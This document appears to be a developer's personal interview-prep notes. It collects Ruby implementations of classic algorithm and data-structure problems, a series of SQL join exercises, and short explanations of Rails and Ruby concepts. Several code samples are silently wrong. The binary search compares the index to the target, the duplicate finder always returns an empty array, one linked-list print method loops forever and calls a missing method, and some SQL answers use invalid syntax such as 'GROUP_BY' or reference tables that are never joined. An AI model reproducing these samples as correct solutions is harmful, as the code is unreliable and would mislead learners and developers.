
=============================================

Searching Algo - 

1. Linear Search -
# Linear search is a simple algorithm that checks each element in a list sequentially until the desired element is found or the list ends

def linear_search(arr, target)
  output = 0
  arr.each_with_index do |ele, index|
    return index if ele == target
  end
  output
end

array = [10, 20, 30, 40, 50]
target = 30

result = linear_search(array, target)

2. Binary Search - 
# Key Points ->
# Sorted Array: Binary search requires a sorted array.
# Divide and Conquer: The algorithm repeatedly divides the search interval in half.
# Efficiency: Binary search has a time complexity of O(logn), making it much more efficient than linear search for large arrays.

def binary_search(arr, target)
  low = 0
  high = arr.length - 1

  while low <= high
    mid = (low + high)/2
    mid_ele = arr[mid]
    if mid == target
      return mid
    elsif mid_ele < target
      low = mid + 1
    else
      high = mid - 1
    end
  end
  nil
end

array = [10, 20, 30, 40, 50, 60, 70]
target = 40

result = binary_search(array, target)

=============================================

Sorting Algo --

1. Bubble sort - 
# O(n^2)
# Bubble Sort repeatedly steps through the list, compares adjacent elements, and swaps them if they are in the wrong order. The process repeats until the list is sorted.

=============================================

Linked List -
# Has node and next pointer 

class Node
  attr_accessor :data, :next

  def initialize(data)
    @data = data
    @next = nil
  end
end

class LinkedList
  attr_accessor :head

  def initialize
    @head = nil
  end

  # Method to add a new node at the end of the list
  def append(data)
    new_node = Node.new(data)
    if @head.nil?
      @head = new_node
    else
      current = @head
      current = current.next while current.next # go to last node of the linked list
      current.next = new_node
    end
  end

  # Method to add a new node at the beginning of the list
  def prepend(data)
    new_node = Node.new(data)
    new_node.next = @head
    @head = new_node
  end

  # Method to delete a node by value

  3 -> 7 -> 4 -> 8

  delete(4)

  def delete(data)
    return if @head.nil?

    if @head.data == data
      @head = @head.next
      return
    end

    current = @head
    while current.next && current.next.data != data
      current = current.next
    end

    if current.next
      current.next = current.next.next
    end
  end

  # Method to display the linked list
  def display
    current = @head
    while current
      print "#{current.data} -> "
      current = current.next
    end
    puts "nil"
  end
end


list = LinkedList.new

# Append elements to the list
list.append(10)
list.append(20)
list.append(30)

# Display the list
puts "List after appending elements:"
list.display

# Prepend an element to the list
list.prepend(5)
puts "List after prepending an element:"
list.display

# Delete an element from the list
list.delete(20)
puts "List after deleting an element:"
list.display


Stack -

class Stack
  def initialize
    @stack = []
  end

  def push(element)
    @stack.push(element)
  end

  def pop 
    @stack.pop
  end

  def peek
    @stack.last
  end

  def is_empty?
    @stack.size == 0
  end
end

stack = Stack.new
stack.push(6)
stack.peek
puts stack.inspect


Queue -

class Queue
  def initialize
    @queue = []
  end

  def push(element)
    @queue << element
  end

  def pop
    @queue.shift
  end

  def peek
    @queue.first
  end

  def is_empty?
    @queue.size == 0
  end
end




=============================================

Array questions - 


1. Finding the missing element in the array of n elements
ex - [1, 2, 4, 5, 6]

def find_missing_element(arr, n)
  sum = arr.sum
  actual_sum = (n + n*n)/2
  missing_element = actual_sum - sum
end

arr = [1, 2, 4, 5, 6]
n = 6

2. Find duplicate in an array - 
# We can use Floyd’s Tortoise and Hare (Cycle Detection) algorithm to find the duplicate number. The algorithm works by using two pointers moving at different speeds to detect a cycle. 
# For achieving O(n) time
ex - [1, 3, 4, 2, 2]

def find_duplicate(arr)
  duplicate_array = arr - arr.uniq
end


3. Find the largest and the smallest numbers in the unsorted array -

def find_min_max(arr)
  min = arr.min
  max = arr.max
  [min, max]
end

arr = [3, 5, 1, 8, 9, 2]
min, max = find_min_max(arr)

4. Rotate an Array by k Positions

arr = [3, 5, 1, 8, 9, 2, 6, 7]
# after reverse 
[7, 6, 2, 9, 8, 1, 5, 3]
# swapp 
input - arr , k = 4
output = [9, 2, 6, 7, 3, 5, 1, 8]


# def shift_array_to_right(arr, k)
#   arr[k...arr.length]
#   reverse_array = arr.reverse!
#   start_point = 0
#   end_point = k-1
#   ((k/2) + 1).times do |i|
#     break if start_point == end_point
#     temp = reverse_array[start_point]
#     reverse_array[start_point] = reverse_array[end_point]
#     reverse_array[end_point] = temp
#     start_point += 1
#     end_point -= 1
#   end
#   reverse_array
# end

def shift_array_to_right(arr, k)
  arr[k...arr.length].concat(arr)[0...arr.length]
end

arr = [3, 5, 1, 8, 9, 2, 6, 7]
shift_array_to_right(arr, 4)

5. Find the Maximum Sum of continuos Subarray
# Kadanes algorithm

def kadanes_algo(arr)
  max_ends = arr[0]
  max_sum_so_far = arr[0]

  (1...arr.length).each do |i|
    max_ends = [arr[i], max_ends + arr[i]].max
    max_sum_so_far = [max_ends, max_sum_so_far].max
  end
  max_sum_so_far
end

arr = [-2, 1, -3, 4, -1, 2, 1, -5, 4]
kadanes_algo(arr)



6. Merge 2 sorted arrays 

# Input: [2, 3, 6, 7, 8], [1, 4, 5]
# merge_array = [1, 2, 3, 4, 5, 6, 7, 8]

def merge_sorted_arrays(array1, array2)
  merged_array = []
  first_pointer = 0
  second_pointer = 0
  loop do 
    if second_pointer >= array2.length
      merged_array = merged_array + (array1 - merged_array)
      return merged_array
    elsif first_pointer >= array1.length
      merged_array = merged_array + (array2 - merged_array)
      return merged_array
    end
    if array2[second_pointer] <= array1[first_pointer]
      merged_array << array2[second_pointer]
      second_pointer += 1
    else 
      merged_array <<  array1[first_pointer]
      first_pointer += 1
    end
  end
end

array1 = [2, 3, 6, 7, 8]
array2 = [1, 4, 5]
merge_sorted_arrays(array1, array2)


def merge_sorted_arrays(array_1, array_2)
  merged_array = []
  first_pointer = 0
  second_pointer = 0
  loop_length = [array_1.length, array_2.length].max
  loop do
    if second_pointer >= array_2.length
      merged_array = merged_array + (array_1 - merged_array)
      return merged_array
    elsif first_pointer >= array_1.length
      merged_array = merged_array + (array_2 - merged_array)
      return merged_array
    end
    if array_1[first_pointer] > array_2[second_pointer]
      merged_array = merged_array.append(array_2[second_pointer])
      second_pointer += 1
    elsif array_1[first_pointer] < array_2[second_pointer]
      merged_array = merged_array.append(array_1[first_pointer])
      first_pointer += 1
    end
  end
  merged_array
end

array_1 = [2, 3, 6]
array_2 = [1, 4, 5]

merge_sorted_arrays(array_1, array_2)

7. Move all zeroes to the end of the array - 


def move_number_to_right(arr, k)
  number_of_k = arr.count(k)
  result_arr = arr - [k]
  result_arr = result_arr + [k]*number_of_k
end

arr = [0, 3, 5, 6, 2, 0, 0]
move_number_to_right(arr, 0)


================================================

String Manipulation - 

1. Reverse a String -

def reverse_string(str)
  reversed = ""
  str_length = str.length
  str_length.times { |i| reversed += str[str_length - i - 1]}
  reversed
end

reverse_string("hello")

2. Check if a string is a palindrome

def check_if_palindrome?(str)
  left = 0
  right = str.length - 1
  while left < right
    return "Not a palindrome" if str[left] != str[right]
    left += 1
    right -= 1
  end
  "Is a palidrome"
end

check_if_palindrome?("racecar")

3. Count the number of vowels in a string

def vowels_count(str)
  vowels = "aeiouAEIOU"
  count = 0
  str.each_char { |char| count += 1 if vowels.include?(char) }
  count
end

vowels_count("hello")

4. Find the first non-repeating character in a string

def first_non_repeating_char(str)
  non_repeating = []
  repeating = []
  str.each_char do |char|
    if non_repeating.include?(char) || repeating.include?(char)
      non_repeating.delete(char)
      repeating.append(char)
    else
      non_repeating.append(char)
    end
  end
  non_repeating.first
end

first_non_repeating_char("swiss")

5. Check if two strings are anagrams

def anagrams?(str1, str2)
  return str1.chars.sort == str2.chars.sort 
end

def anagrams?(str1, str2)
  str1_char_map = {}
  str2_char_map = {}
  str1.each_char do |char|
    str1_char_map[char] ||= 0
    str1_char_map[char] += 1
  end
  str2.each_char do |char|
    str2_char_map[char] ||= 0
    str2_char_map[char] += 1
  end
  str1_char_map.each do |key, val|
    return false if str2_char_map[key] != val
  end
  true
end

anagrams?('lemon', 'melon')

6. Find the length of the longest substring without repeating characters - 

str = 'abcdabefg'

def longest_substring(str)
  start = 0
  max_length = 0
  char_mapper = {}
  str.each_char.with_index do |char, i|
    if char_mapper[char] && char_mapper[char] >= start
      start = char_mapper[char] + 1
    end
    char_mapper[char] = i
    max_length = [max_length, i - start + 1].max
    puts "#{char_mapper}, start = #{start}, max_length = #{max_length} " 
  end
  max_length
end

7. Find the longest palindromic substring -

def is_palindrome?(str)
  left = 0
  right = str.length - 1
  while left < right
    return false if str[left] != str[right]
    left += 1
    right -= 1
  end
  true
end

str= "abcbobiracecarhb"

def largest_palindrome_sequence(str)
  start = 0
  finish = 1
  max_length_string = ""
  while start < finish
    if str[start] == str[finish] && is_palindrome?(str[start, finish])
      current_substring = str[start, finish]
      max_length_string = current_substring if current_substring.length > max_length_string.length
      start += 1
      finish = start
      puts max_length_string
    end
    if finish == str.length - 1
      start += 1
    else
      finish += 1
    end
  end
  max_length_string
end

8. Reverse sort an array

def reverse_sort(array)
  reverse_sort_arr = []
  no_of_elements = array.length
  no_of_elements.times do |i|
    max = find_max(array)
    reverse_sort_arr << max
    array.delete(max)
  end
  reverse_sort_arr
end 

def find_max(arr)
  max = 0
  arr.each { |ele| max = [max, ele].max }
  max
end

9. Find the maximum product of two integers in an array

def max_product(array)
  first_max_number = find_max(array)
  array.delete(first_max_number)
  second_max_number = find_max(array)
  first_max_number * second_max_number
end

def find_max(array)
  max = 0
  array.each do |ele|
    max = ele if ele > max
  end
  max
end

array = [9, 4, 3, 7, 5]
max_product(array)

10. Two sum problem: Given an array of integers, return indices of the two numbers such that they add up to a specific target

def index_of_number_sum(array, target)
  index_2 = 0
  index_1 = 0
  array.each_with_index do |ele, i|
    if array.include?(target - ele)
      index_2 = array.index(target - ele)
      index_1 = i
      return [index_1, index_2] 
    end
  end
end

array = [9, 4, 3, 7, 5, 8]
target = 11
index_of_number_sum(array, target)

11. Move zeroes to the end

def move_zeroes_to_end(array)
  zero_pointer = 0
  right_pointer = array.length - 1
  # iteration_number = 0
  array.each_with_index do |ele, i|
    right_pointer -= 1 until array[right_pointer] != 0
    return array if right_pointer < i
    if ele == 0
      # puts "CurrentArray" + array.inspect
      # puts "Found zero for - " + iteration_number.to_s
      # puts "Current element - " + ele.to_s
      
      # puts "Right pointer element - " + array[right_pointer].to_s
      array[i] = array[right_pointer]
      # puts array[right_pointer]
      array[right_pointer] = 0
      right_pointer -= 1
      # puts "Afterswap array - " + array.inspect
      # puts "Afterswap right pointer - " + right_pointer.to_s
    end
    # iteration_number += 1
    zero_pointer += 1
  end
  array
end

array = [0, 9, 4, 0, 3, 7,0, 0, 5, 8, 0]
move_zeroes_to_end(array)


12. Group anagrams: Given an array of strings, group anagrams together.

def is_anagram?(first_string, second_string)
  first_char_mapper = {}
  second_char_mapper = {}
  first_string.each_char do |char|
    first_char_mapper[char] ||= 0
    first_char_mapper[char] += 1
  end
  second_string.each_char do |char|
    second_char_mapper[char] ||= 0
    second_char_mapper[char] += 1
  end
  return false if first_char_mapper.keys.length != second_char_mapper.keys.length
  first_char_mapper.each do |char, number|
    return false if second_char_mapper[char] != number
  end
  true
end

def group_anagrams(array)
  grouped_array = []
  array.each do |string|
    next if grouped_array.include?(string)
    grouped_array << string
    anagrams = array.select { |second_string| is_anagram?(string, second_string) }
    grouped_array = grouped_array.union(anagrams)
  end
  grouped_array
end

array = ['lemon', 'silly', 'ear', 'yills', 'bear', 'melon', 'olemn']
group_anagrams(array)


=====================================================

Linked List 

class Node 
  attr_accessor :data, :next
  
  def initialize(val)
    @data = val
    @next = nil
  end
end

class LinkedList
  attr_accessor :head

  def initialize(val)
    @head = Node.new(val)
    @head.next = nil
  end

  def print(node)
    node_vals = []
    if !node.next
      node_vals << node.val
    else
      current = node
      while current.next
        node_vals << current.val
        current = node.next
      end
    end
    node_vals.join('->')
  end

  def append(val)
    head = self.head
    node = Node.new(val)
    if !head.next
      head.next = node
    else
      current_node = head.next
      current_node = current_node.next while current_node.next
      current_node.next = node
    end
    head
  end

  def prepend(val)
    head = self.head
    node = Node.new(val)
    node.next = head
    head = node
    head
  end

  def delete(val, position = 1)
    # val = 8
    # position = 2
    current =self.head
    node_counter = 0
    # position = 2
    previous_node = current
    while node_counter != position
      previous_node = node_found?(current, val)
      node_counter += 1
      current = previous_node.next.next
    end
    previous_node.next = previous_node.next.next
    self.head
  end

  def reverse
    previous = nil
    current = self.head
    while current
      current_next = current.next
      current.next = previous
      previous = current
      current = current_next
    end
    self.head = previous
  end

  private

  # returns the previous node of the node to be deleted
  def node_found?(node, val)
    current = node
    until current.next.data == val
      current = current.next
    end
    current
  end


end

delete(8, 2)
input => linked_list = 3 -> 7 -> 8 -> 4 -> 9 -> 7 -> 8 -> 4 -> 6, number = 8, position = 1
output => 3 -> 7 -> 8 -> 4 -> 9 -> 7 -> 4 -> 6


2. Reverse Linked List -

def reverse
  previous = nil
  current = self.head
  while current
    current_next = current.next
    current.next = previous
    previous = current
    current = current_next
  end
  self.head = previous
end

linked_list = LinkedList.new(2)
linked_list.append(8)
linked_list.append(6)
linked_list.append(9)
linked_list.reverse
puts linked_list.print


3. Find the middle of a Linked List

def middle_of_linked_list(list)
  head = list.head
  current = head
  length_of_list = 0
  while current
    length_of_list += 1
    current = current.next
  end
  mid = length_of_list/2
  current = head
  mid.times do |i|
    current = current.next
  end
  current
end

4. Merge two sorted linked lists

def merge_sorted_linked_lists(list1, list2)
  first_head = list1.head
  second_head = list2.head
  first_list_pointer = first_head
  second_list_pointer = second_head
  sorted_list = nil
  if first_head.data > second_head.data
    sorted_list = LinkedList.new(second_head.data)
    second_list_pointer =  second_head.next
  else
    sorted_list = LinkedList.new(first_head.data)
    first_list_pointer = first_head.next
  end
  while second_list_pointer.next && first_list_pointer.next
    if first_list_pointer.data > second_list_pointer.data
      sorted_list.append(second_list_pointer.data)
      second_list_pointer = second_list_pointer.next if second_list_pointer.next
    else
      sorted_list.append(first_list_pointer.data)
      first_list_pointer = first_list_pointer.next if first_list_pointer.next
    end
  end
  sorted_list.tail.next = first_list_pointer.next ? first_list_pointer : second_list_pointer
  sorted_list
end

list1_elements = [2, 5, 6, 8]
list2_elements = [1, 3, 5, 7, 9, 11, 12]
list1 = LinkedList.new(list1_elements.first)
list2 = LinkedList.new(list2_elements.first)
list1_elements.shift
list2_elements.shift
list1_elements.each { |ele| list1.append(ele) }
list2_elements.each { |ele| list2.append(ele) }
puts list1.print
puts list2.print

sorted_list = merge_sorted_linked_lists(list1, list2)
puts sorted_list.print

5. Remove nth node from the end

def remove_last_nth_node(list, position)
  list_length = list.length
  node_index = list_length - position + 1
  if node_index == 1
    list.head = list.head.next
    return list
  end
  current_pos = 1
  current = list.head
  previous = nil
  until node_index == current_pos
    previous = current
    current = current.next
    current_pos += 1
  end
  if current.next
    previous.next = current.next
  else
    previous.next = nil
  end
  list
end

list2_elements = [1, 3, 5, 7, 9, 11, 12]
list2 = LinkedList.new(list2_elements.first)
list2_elements.shift
list2_elements.each { |ele| list2.append(ele) }
puts list2.print

list = remove_last_nth_node(list2, 7)
puts list.print


=====================================================

SQL query - 

https://www.w3resource.com/sql-exercises/joins-hr/index.php

1. SELECT e.first_name, e.last_name, d.department_name, d.department_id
FROM EMPLOYEE AS e
INNER JOIN DEPARTMENT AS d
ON d.department_id = e.department_id

2. SELECT e.first_name, e.last_name, d.department_name, l.city, l.province 
FROM EMPLOYEE AS e
JOIN DEPARTMENT AS d
ON d.department_id = e.department_id
JOIN LOCATION AS l
ON l.location_id = d.location_id

3. SELECT e.first_name, e.last_name, e.salary, j.grade_level
FROM employee e
JOIN job_grades j
ON e.salary BETWEEN j.lowest_sal AND j.highest_sal

4. SELECT e.first_name, e.last_name, e.department_id, d.department_name
FROM employees e
JOIN departments d
ON e.department_id = d.department_id
AND d.department_id IN (80, 40)
ORDER BY e.last_name

5. SELECT e.first_name, e.last_name, e.department_id, d.department_name
FROM employees e
JOIN departments d
ON e.department_id = d.department_id
JOIN locations l
ON l.location_id = d.location_id
WHERE e.first_name LIKE "%z%"

6. SELECT e.first_name, e.last_name, e.department_id, d.department_name
FROM employees e
RIGHT OUTER JOIN departments d
ON e.department_id = d.department_id

7. SELECT e.first_name, e.last_name, e.salary
FROM employees e
JOIN employees s
ON e.salary < s.salary AND s.employee_id = 182

Alternatively

SELECT e.first_name, e.last_name, e.salary
FROM employees e
WHERE e.salary < ( SELECT salary FROM employees WHERE employee_id = 182 )

8. SELECT e.first_name, m.first_name
FROM employees e
JOIN employees m
ON e.manager_id = m.employee_id

9. SELECT d.department_name, l.city, l.state, l.province
FROM departments d
LEFT OUTER JOIN locations l
ON d.location_id = l.location_id

12. SELECT e.first_name, e.last_name, e.department_id
FROM employees e
JOIN employees m
ON e.department_id = m.department_id AND m.last_name = 'Taylor'

13. SELECT e.first_name, d.department_name, j.job_title, jh.start_date
FROM employees e
WHERE e.hire_date BETWEEN 1993-01-01 AND 1997-07-31

14. SELECT job_title, first_name || ' ' || last_name AS Employee_name, max_salary - salary As Salary Difference
FROM employees
NATURAL JOIN jobs

15. SELECT department_name, AVG(salary) AS avg, COUNT(commission_pct)
FROM departments
JOIN employees USING (department_id)
GROUP_BY department_name 

16. SELECT job_title, first_name ||  ' '  || last_name AS employee_name, max_salary - salary AS salary_difference
FROM employees e
JOIN jobs USING (job_id)
WHERE e.department_id = 80

17. SELECT c.country_name, l.city, d.department_name
FROM countries c
JOIN locations l USING (country_id)
JOIN departments d USING (location_id)

18. SELECT e.first_name || " " || e.last_name, d.department_name
FROM employees e
JOIN departments d
ON e.employee_id = d.manager_id

19. SELECT AVG(salary) AS avg_salary, job_title
FROM employees 
JOIN jobs USING (job_id)
GROUP_BY job_title

20. SELECT jh.* 
FROM job_history jh
JOIN employees USING (employee_id)
WHERE salary > 120000


=======================================================


# Binary trees -

class Node 
  attr_accessor :value, :left, :right

  def initialize(value)
    @value = value
    @left = nil
    @right = nil
  end

end

# construct tree - 

root = Node.new(1)
root.left = Node.new(2)
root.right = Node.new(3)
root.left.left = Node.new(4)
root.left.right = Node.new(5)
root.right.left = Node.new(6)
root.right.right = Node.new(7)

1. DFS and its types - 

# left -> root -> right
def in_order(node)
  return if node.nil?
  in_order(node.left)
  print "#{node.value} "
  in_order(node.right)
end

# root -> left -> right 
def pre_order(node)
  return if node.nil?
  print "#{node.value} "
  pre_order(node.left)
  pre_order(node.right)
end

# left -> right -> root 
def post_order(node)
  return if node.nil?
  post_order(node.left)
  post_order(node.right)
  print "#{node.value} "
end


def dfs(node)
  return if node.nil?
  
  print "#{node.value} "
  dfs(node.left)
  dfs(node.right)
end

puts dfs(root)

2. BFS - 
# Has to be implemented using queue/array

def level_order(root)
  return if root.nil?
  queue = [root]
  until queue.empty?
    node = queue.shift
    puts node.value
    queue << node.left if node.left
    queue << node.right if node.right
  end
end

level_order(root)

3. Find the height of the tree - 

# Example tree:
#     1
#    / \
#   2   3
#  / \
# 4   5

def height(node)
  return -1 if node.nil?
  left_height = height(node.left)
  right_height = height(node.right)
  height = [left_height, right_height].max + 1
end

root = Node.new(1)
root.left = Node.new(2)
root.right = Node.new(3)
root.left.right = Node.new(5)
root.left.left = Node.new(4) 

puts height(root)

4. Check if the tree is balanced - 

# Example tree:
#     1
#    / \
#   2   3
#  / \
# 4   5

def check_if_balanced?(node)
  return true if node.nil?
  left_height = height(node.left)
  right_height = height(node.right)
  (left_height - right_height).abs <= 1 && check_if_balanced?(node.left) && check_if_balanced?(node.right)
end

5. Check if the binary tree is bst - 
# binary search tree has left < root < right 

def is_bst?(node, min = -Float::INFINITY, max = Float::INFINITY)
  return true if node.nil?
  return false if node.value <= min || node.value >= max
  is_bst?(node.left, min, node.value) && is_bst?(node.right, node.value, max)
end

============================================

Merge sort - 

def merge_sort(array)
  return array if array.length <= 1
  mid = array.length/2
  left_array = merge_sort(array[0...mid])
  right_array = merge_sort(array[mid...array.length])

  merge(left_array, right_array)
end

def merge(left, right)
  sorted = []
  until left.empty? || right.empty?
    if left.first <= right.first
      sorted << left.shift
    else
      sorted << right.shift
    end
  end
  sorted.concat(left).concat(right)
end

=========================================

Rails -

Self referential models 
- Here the employee has his/her manager which again is an employee only, a manager who is an employee can have many subordinates (vice-versa).

class Employee < ApplicationRecord
  belongs_to :manager, class_name: 'Employee', optional: true
  has_many :subordinates, class_name: 'Employee', foreign_key: 'manager_id'
end

==========================================

Q. What are some of the database level operations that can be performed so that it improves the performance of the system - 

1. Indexing - 
- Indexes can significantly increase the speed of data retrival
CREATE INDEX index_name ON table_name (column_name);

- Using composite indexes can help as well which queries on multiple columns at once 
CREATE INDEX index_name ON table_name (column_1, column_2);

2. Query Optimization - 
- Analyze Query Execution Plans , use Explain like tools for examining queries
EXPLAIN SELECT * FROM table_name WHERE column_name = value;
Refactor queries to avoid unnecessary complexity, use joins efficiently, and avoid operations that require scanning large tables.

3. Normalize Tables 
remove redundancy from the tables and shorten the size of tables so that queries are efficient and data is lesser.

4. Denormalise - 
Sometimes, denormalization (introducing redundancy) can improve performance by reducing the number of joins required for complex queries. This should be done carefully to balance between performance and data integrity.

5. Implement Caching - 
Use caching mechanisms (like query caching or object caching) to store the results of expensive queries or frequently accessed data.

6. Table Partitioning - 
Split large tables into smaller, more manageable pieces based on certain criteria (like date ranges). This can improve query performance and manageability.
CREATE TABLE table_name (
  id INT,
  data VARCHAR(255),
  created_at DATE
) PARTITION BY RANGE (YEAR(created_at)) (
  PARTITION p0 VALUES LESS THAN (2000),
  PARTITION p1 VALUES LESS THAN (2010),
  PARTITION p2 VALUES LESS THAN (2020)
);

7. Database Sharding - 
Distribute data across multiple database instances to balance load and improve performance. This involves partitioning data across different databases.

8. Use Connection Pools - 
Implement connection pooling to reuse database connections instead of creating new ones for each request. This reduces the overhead associated with connection management.

9. Monitoring and Profiling - 
Continuously monitor database performance using tools and metrics to identify and address performance issues.
Use profiling tools to analyze query performance and find slow queries.

10. Data Archiving - 
Move historical or infrequently accessed data to separate archive tables or databases to keep the active tables smaller and more performant.

11. Concurrency Control - 
Properly manage locks and transactions to avoid contention and ensure efficient concurrency control.

12. Data Compression - 
Use data compression techniques to reduce the size of the data stored on disk and the amount of I/O required.


Q. after_create vs after_save vs after_commit - 

after_create: Runs after create but before commit.
after_save: Runs after create or update but before commit.
after_commit: Runs after the entire transaction has been committed.

after_create: Only runs on create.
after_save: Runs on both create and update.
after_commit: Runs after any transaction (can be scoped to on: :create, on: :update, or on: :destroy).

after_commit is the safest choice for actions that rely on the data being fully committed (e.g., sending emails or enqueuing background jobs) since it only runs after the transaction is complete and the data is fully persisted.

class User < ApplicationRecord
  after_commit :send_welcome_email, on: :create

  private

  def send_welcome_email
    UserMailer.welcome_email(self).deliver_later
  end
end


Q. Garbage Collection in ruby

- The garbage collector (GC) is responsible for finding and freeing unused objects.

Object Allocation: When you create a new object, memory is allocated for that object from the heap.
Mark Phase: The GC identifies all objects that are still in use by traversing object references starting from root objects.
Sweep Phase: The GC scans through the heap, freeing objects that were not marked in the mark phase.
Generational Promotion: Objects that survive multiple garbage collection cycles are promoted to the old generation.

- Commands for manually triggering garbage collection.
GC.start: Manually initiate garbage collection.
GC.enable: Enable garbage collection.
GC.disable: Disable garbage collection.
GC.stat: Get statistics about the garbage collector.
GC.compact: Manually trigger a compaction of the heap (Ruby 2.7+).

- Use tools like memory_profiler or ruby-prof to profile memory usage and identify memory leaks.



Q. Counter cache in rails - 

Rails counter caches are a mechanism to keep track of the number of associated records efficiently. Instead of performing a COUNT query every time the count of associated records is needed, Rails stores the count in a dedicated column on the parent record, updating it automatically as records are created or destroyed.

Add an integer column to the parent model to store the count of associated records. By convention, this column is named #{association_name}_count.

rails generate migration AddCommentsCountToPosts comments_count:integer
class Comment < ApplicationRecord
  belongs_to :post, counter_cache: true
end

Manually resetting the counters - 
Post.reset_counters(post.id, :comments)


Q. Active record vs Application Record 

ActiveRecord is a module in Rails that provides an interface between Ruby classes and database tables. It is part of the Active Record pattern, an ORM (Object-Relational Mapping) system that allows developers to interact with the database using Ruby objects instead of writing raw SQL queries.

ApplicationRecord is a convention introduced in Rails 5. It serves as the superclass for all application-specific models. By inheriting from ApplicationRecord instead of directly from ActiveRecord::Base, you have a centralized place to define behavior and configuration that applies to all models in your application.

class ApplicationRecord < ActiveRecord::Base
  self.abstract_class = true

  # Common behavior for all models can be defined here
  def self.recent
    order(created_at: :desc)
  end
end

Q. Monkey Patching

Suppose you want to add a custom method to all ActiveRecord models. You can open the ActiveRecord::Base class and add your method:

module ActiveRecordExtensions
  def last_updated_at
    order(updated_at: :desc).first&.updated_at
  end
end

ActiveRecord::Base.extend(ActiveRecordExtensions)


Q. .send() vs .call()

.send: Used to call methods dynamically by name on an object, including private and protected methods.
.call: Used to execute a Proc or Lambda.
.send: Allows dynamic invocation of methods where the method name is determined at runtime.
.call: Executes a block of code that has already been defined as a Proc or Lambda.


Q. Procs and Lambdas

Arguments handling -
- Procs are more lenient with arguments. They do not enforce the number of arguments passed to them. If too few arguments are given, the missing arguments are set to nil. If too many arguments are given, the extra arguments are ignored.
my_proc = Proc.new { |x, y| puts "x: #{x}, y: #{y}" }
my_proc.call(1)            # Outputs: x: 1, y: 
my_proc.call(1, 2, 3)      # Outputs: x: 1, y: 2
-  Lambdas are strict with arguments.
my_lambda = ->(x, y) { puts "x: #{x}, y: #{y}" }
my_lambda.call(1)            # Raises ArgumentError
my_lambda.call(1, 2, 3)      # Raises ArgumentError

Return handling -
Procs: When a return statement is used inside a Proc, it returns from the method enclosing the Proc, not just from the Proc itself. This can cause unexpected behavior if not carefully managed.
def proc_example
  my_proc = Proc.new { return "Returning from Proc" }
  my_proc.call
  "This line is never reached"
end

puts proc_example  # Outputs: Returning from Proc

Lambdas: When a return statement is used inside a lambda, it returns from the lambda itself, not from the enclosing method.
def lambda_example
  my_lambda = -> { return "Returning from Lambda" }
  my_lambda.call
  "This line is reached"
end

puts lambda_example  # Outputs: This line is reached

Procs are generally used when you want a more flexible and forgiving block of code. They are useful for callbacks and general block handling where the argument count and return behavior are less critical.
Lambdas are used when you need stricter argument checking and more predictable return behavior. They are often used in functional programming contexts and where the behavior needs to be more controlled


Q. Calling block, procs and lambdas 

Blocks - 
def my_method(&block)
  block.call('hello') if block
end

def my_method
  yield("hello") if block_given?
end

my_method do |greeting|
  "this is block called with yield - #{greeting}"
end

my_method { |greeting| puts "This is block greating - #{greeting}" }

Procs - 

def my_method(proc1, proc2)
  proc1.call
  proc2.call
end

proc1 = Proc.new { "This is a proc1" }
proc2 = Proc.new { "This is a proc2" }

my_method(proc1, proc2)


Q. Ways of declaring class methods in ruby - 

Using 'self' - 
class MyClass
  def self.class_method
    "This is a class method"
  end
end
puts MyClass.class_method  # Outputs: This is a class method

Using class << self- 
class MyClass
  class << self
    def class_method1
      "Class method 1"
    end

    def class_method2
      "Class method 2"
    end
  end
end
puts MyClass.class_method1  # Outputs: Class method 1
puts MyClass.class_method2  # Outputs: Class method 2

Using Module extend - 
module MyModule
  def class_method
    "This is a class method from MyModule"
  end
end
class MyClass
  extend MyModule
end
puts MyClass.class_method  # Outputs: This is a class method from MyModule


Q. What are singleton methods in ruby 

A singleton method is a method that is defined on a single object rather than on the class or module to which the object belongs.
This means the method is only available to that particular object and not to other instances of the same class or module. 

object = "I am a string"
def object.unique_method
  "This is a singleton method"
end
puts object.unique_method  # Outputs: This is a singleton method


object = "I am a string"
object.define_singleton_method(:dynamic_method) do
  "This is a dynamically defined singleton method"
end
puts object.dynamic_method  # Outputs: This is a dynamically defined singleton method


Q. Singleton Class

singleton class (also known as a metaclass or eigenclass) is a special class that is associated with a single object. Each object in Ruby has its own singleton class where methods and properties specific to that object can be defined.

object = "I am a string"
class << object # singleton class
  def unique_method
    "This is a singleton method"
  end
end
puts object.unique_method  # Outputs: This is a singleton method


Q. RESTful vs REST 

REST (Representational State Transfer)
REST is an architectural style for designing networked applications.  It was introduced by Roy Fielding in his doctoral dissertation and is based on a set of principles and constraints that aim to make web services more scalable, stateless, and efficient.

RESTful refers to systems, APIs, or applications that adhere to the principles and constraints of REST.
When a system is described as RESTful, it means that it follows the REST architectural style and implements its principles effectively.

characteristics - 
Resource-Oriented: RESTful systems are designed around resources and their representations. Each resource is accessible through a unique URI.
HTTP Methods: RESTful APIs use standard HTTP methods (GET, POST, PUT, DELETE) to perform operations on resources.
Stateless: Each request to a RESTful API must contain all the information necessary to process the request, as no state is stored on the server between requests.
Representation: Resources can be represented in various formats (e.g., JSON, XML). The client interacts with the resource through its representation.

RESTful Api design 
class UsersController < ApplicationController
  # GET /users
  def index
    @users = User.all
    render json: @users
  end

  # GET /users/:id
  def show
    @user = User.find(params[:id])
    render json: @user
  end

  # POST /users
  def create
    @user = User.new(user_params)
    if @user.save
      render json: @user, status: :created
    else
      render json: @user.errors, status: :unprocessable_entity
    end
  end

  # PUT /users/:id
  def update
    @user = User.find(params[:id])
    if @user.update(user_params)
      render json: @user
    else
      render json: @user.errors, status: :unprocessable_entity
    end
  end

  # DELETE /users/:id
  def destroy
    @user = User.find(params[:id])
    @user.destroy
    head :no_content
  end

  private

  def user_params
    params.require(:user).permit(:name, :email)
  end
end



Q. Has many :through and has_and_belongs_to_many 

Has many :through ->

class Patient
  has_many :appointments
  has_many :doctors, through: :appointments
end
class Doctor
  has_many :appointments 
  has_many :patients, through: :appointments
end
class Appointment
  belongs_to :patient
  belongs_to :doctor
end

Appointment table - foreign_keys - patient_id, doctor_id

The has_many :through association is also useful for setting up "shortcuts" through nested has_many associations. For example, if a document has many sections, and a section has many paragraphs, you may sometimes want to get a simple collection of all paragraphs in the document. You could set that up this way:

class Document
  has_many :sections 
  has_many :paragraphs, through: :sections
end

class Section
  belongs_to :document
  has_many :paragraphs
end

class Paragraph
  belongs_to :section
end

Section table - foreign_key - document_id
Paragraph table - foreign_key - section_id

@document.paragraphs = 


has_and_belongs_to_many -->

class Author < ApplicationRecord
  has_and_belongs_to_many :books
end
class Book < ApplicationRecord
  has_and_belongs_to_many :authors
end

For a has_and_belongs_to_many association, you need to create a join table that connects the two models. The join table typically contains foreign keys for the associated models.
For example, if you have models Author and Book, the join table should be named 'authors_books'.

